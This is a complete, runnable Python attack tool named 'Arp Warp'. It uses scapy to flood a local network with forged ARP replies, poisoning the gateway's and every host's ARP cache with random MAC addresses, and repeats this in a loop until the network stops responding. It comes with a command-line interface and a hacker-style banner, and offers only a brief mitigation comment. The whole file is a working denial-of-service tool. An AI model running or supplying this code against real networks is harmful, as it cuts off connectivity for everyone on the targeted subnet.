import argparse
import logging
import ipaddress
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings

from scapy.all import *
conf.verb = 0

#   --------------------------------------------------------------------------------------------------------------------
#
#   Arp Warp attack - Continously poison the ARP cache of all hosts on the connected network to make it unresponsive
#
#   Notes
#       * 
#
#   Mitigation
#       * Static ARP table
#       * Use IPv6
#
#   --------------------------------------------------------------------------------------------------------------------

banner = """
......_ ........______....... __........ ____....
...../ \.. ____|    \ \ ...../ /___ ____|    \...
..../   \.|  __|     \ \ /\ / /    |  __|     |..
.../ /.\ \| |  |  __/.\      /     | |..|  __/...
../_/...\_\_|..|_|.....\_/\_/.\____|_|..|_|......
"""


class ArpWarp:
    _P_TIMEOUT = 2
    _P_RETRY = 10

    def __init__(self, iface, cidr, s_time, gateway):
        print(f"[*] Setting up attacker...")

        self.network_interface = iface
        conf.iface = self.network_interface
        self.cidr = cidr
        self.arp_poison_interval = s_time

        self.my_private_ip = get_if_addr(self.network_interface)
        self.subnet = self.my_private_ip.split(".")[:3]

        self.gateway_ip = gateway or f"{'.'.join(self.subnet)}.1"
        self.gateway_mac = getmacbyip(self.gateway_ip)

        if not self.gateway_mac:
            raise Exception(f"[!] Unable to get gateway mac -> {self.gateway_ip}")

        self.host_ips = [str(host_ip) for host_ip in ipaddress.IPv4Network(f"{'.'.join(self.subnet)}.0/{self.cidr}") if
                         str(host_ip) != self.my_private_ip and str(host_ip) != self.gateway_ip]
        print(f"[*] Generated {len(self.host_ips)} possible host targets for subnet {'.'.join(self.subnet)}.x")

        self.abort = False

    def poison_arp(self):
        """
        * poison the gateway arp cache with a spoofed mac address for every possible host
        * poison every possible host with a spoofed mac address for the gateway
        """
        for host_ip in self.host_ips:
            # poison gateways's arp cache
            arp_packet_gateway = ARP(op=2, psrc=host_ip, hwdst=self.gateway_mac, hwsrc=RandMAC(), pdst=self.gateway_ip)
            sendp(Ether() / arp_packet_gateway, iface=self.network_interface)
            # poison host's arp cache
            arp_packet_host = ARP(op=2, psrc=self.gateway_ip, hwsrc=RandMAC(), pdst=host_ip)
            sendp(Ether() / arp_packet_host, iface=self.network_interface)

    def start_attack(self):
        loop_count = 0
        while not self.abort:
            try:
                loop_count += 1
                self.poison_arp()
                print(f"[*] Finished attack loop -> {loop_count}")
                time.sleep(self.arp_poison_interval)
            except Exception as exc:
                print(f"[!] Exception caught -> {exc}")
                self.abort = True
            except KeyboardInterrupt:
                print(f"[*] User requested to stop...")
                self.abort = True


if __name__ == "__main__":
    print(f"\n{banner}\nWritten by @flashnuke\n{'=' * 49}")
    parser = argparse.ArgumentParser(description=f'Perform an ARP cache poison attack',
                                     usage=f"./{os.path.basename(__file__)} iface")
    parser.add_argument("-i", "--network-interface", dest='iface', type=str, metavar=(""),
                        help="the name of the network interface (from `ifconfig`, i.e -> 'eth0')",
                        required=True)

    parser.add_argument("-m", "--set-mask", dest='mask', type=int, metavar=(""), default=24,
                        help="set the mask range (default -> /24 which means 0-256",
                        required=False)

    parser.add_argument("-s", "--sleep-interval", dest='s_time', type=int, metavar=(""), default=1,
                        help="set the sleep time between each arp poison attempt (default -> 1[sec])",
                        required=False)

    parser.add_argument("-g", "--set-gateway", dest='gateway', type=str, metavar=(""), default=None,
                        help="set the gateway ip manually (defaults to x.x.x.1)",
                        required=False)
    arguments = parser.parse_args()

    warper = ArpWarp(arguments.iface, arguments.mask, arguments.s_time, arguments.gateway)
    warper.start_attack()
